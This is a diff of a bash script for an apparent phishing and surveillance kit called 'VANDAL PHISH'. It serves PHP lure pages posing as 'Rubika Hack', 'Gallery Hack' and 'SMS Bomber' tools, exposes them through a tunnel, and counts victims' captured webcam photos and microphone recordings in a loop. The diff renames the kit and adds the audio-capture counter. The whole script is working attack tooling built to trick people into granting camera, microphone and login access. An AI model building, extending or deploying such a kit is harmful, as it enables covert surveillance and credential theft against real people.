@@ -1,7 +1,7 @@
 #!/bin/bash
 SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
 PORT="${1:-3333}"
-WORK="$HOME/.vandal"
+WORK="$HOME/.vphish"
 mkdir -p "$WORK" && cd "$WORK" || exit 1
 PHP_PID=""; TUN_PID=""; LINK=""
 
@@ -14,27 +14,22 @@ echo " ██║   ██║███████║██╔██╗ ██║
 echo " ╚██╗ ██╔╝██╔══██║██║╚██╗██║██║  ██║██╔══██║██║"
 echo "  ╚████╔╝ ██║  ██║██║ ╚████║██████╔╝██║  ██║███████╗"
 echo "   ╚═══╝  ╚═╝  ╚═╝╚═╝     ╚═╝╚═════╝ ╚═╝  ╚═╝╚══════╝"
-echo -e "\033[0m\033[1;91m     VANDAL KIT v3\033[0m"
+echo -e "\033[0m\033[1;91m     VANDAL PHISH\033[0m"
 echo ""
 }
 
-deps() { command -v php >/dev/null 2>&1 || pkg install -y php >/dev/null 2>&1; command -v ssh >/dev/null 2>&1 || pkg install -y openssh >/dev/null 2>&1; }
+deps() {
+command -v php >/dev/null 2>&1 || { pkg install -y php 2>/dev/null || apt install -y php 2>/dev/null || sudo apt install -y php 2>/dev/null; }
+command -v ssh >/dev/null 2>&1 || { pkg install -y openssh 2>/dev/null || apt install -y openssh-client 2>/dev/null || sudo apt install -y openssh-client 2>/dev/null; }
+}
 
 menu() {
-echo -e "\033[1;96m── Select Page ──\033[0m"
+echo -e "\033[1;96m── Select Template ──\033[0m"
 echo -e "  \033[1;92m[1]\033[0m 💥 SMS Bomber"
 echo -e "  \033[1;92m[2]\033[0m 🔓 Rubika Hack"
 echo -e "  \033[1;92m[3]\033[0m 📸 Gallery Hack"
 echo -e "  \033[1;92m[4]\033[0m 🔐 Rubika Filter"
 read -p $'\033[1;93m[?] Select [1-4]: \033[0m' TEM; TEM="${TEM:-1}"
-
-echo -e "\033[1;96m── Select Module ──\033[0m"
-echo -e "  \033[1;92m[1]\033[0m 📸 Camera"
-echo -e "  \033[1;92m[2]\033[0m 📸+🎤 Camera + Mic"
-echo -e "  \033[1;92m[3]\033[0m 📸+📍 Camera + GPS"
-echo -e "  \033[1;92m[4]\033[0m 📸+📱 Camera + Device"
-echo -e "  \033[1;92m[5]\033[0m 🎯 ALL"
-read -p $'\033[1;93m[?] Select [1-5]: \033[0m' MOD; MOD="${MOD:-5}"
 }
 
 build() {
@@ -50,8 +45,8 @@ cat > index.php <<'PHPEOF'
 PHPEOF
 
 cp "$SCRIPT_DIR/save.php" .
-cp "$SCRIPT_DIR/panel.php" . 2>/dev/null
 cp "$SCRIPT_DIR/login.php" .
+cp "$SCRIPT_DIR/panel.php" .
 
 echo -e "\033[1;92m[+] Ready\033[0m"
 }
@@ -66,10 +61,11 @@ LINK="http://localhost:$PORT"
 
 monitor() {
 echo -e "\n\033[1;93m[*] Waiting... Ctrl+C to stop\033[0m"
-while true; do c=$(ls webcam_*.jpg 2>/dev/null|wc -l); echo -e "\033[1;96m[*] 📸 $c photos | ${LINK}/panel.php\033[0m"; sleep 3; done
+while true; do c=$(ls webcam_*.jpg 2>/dev/null|wc -l); m=$(ls mic_*.webm 2>/dev/null|wc -l); echo -e "\033[1;96m[*] 📸 $c photos | 🎤 $m audio | ${LINK}/panel.php\033[0m"; sleep 3; done
 }
 
 stop() { [ -n "$PHP_PID" ] && kill $PHP_PID 2>/dev/null; [ -n "$TUN_PID" ] && kill $TUN_PID 2>/dev/null; pkill -f "php -S 0.0.0.0:$PORT" 2>/dev/null; rm -f tunnel.log; exit 0; }
+trap stop INT TERM
 
 banner; deps; menu; build; start_php; start_tunnel
 echo -e "\n\033[1;92m══════════════════════════════════════════════════\033[0m"
